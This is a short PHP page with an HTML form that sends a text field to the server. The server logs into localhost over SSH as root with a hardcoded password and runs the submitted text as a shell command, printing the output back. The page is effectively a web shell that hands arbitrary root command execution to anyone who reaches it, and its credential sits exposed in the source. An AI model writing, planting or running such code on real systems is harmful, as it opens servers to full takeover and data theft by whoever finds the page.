<html>
    <body>
        <form method="post" dir="data">
            <input type="text" name="comm" size="150"/>
            <input type="submit" value="exec"/>
        </form>
    </body>
</html>
<?php
if (isset($_POST['comm'])) {
    include('Net/SSH2.php');

    $ssh = new Net_SSH2('localhost');
    if (!$ssh->login('root', 'procesamiento617')) {
        exit('Login Failed');
    } else {
        $rows = explode("\n", $ssh->exec($_POST['comm']));
        foreach($rows as $row) {
            echo $row.'<br/>';
        }
    }
}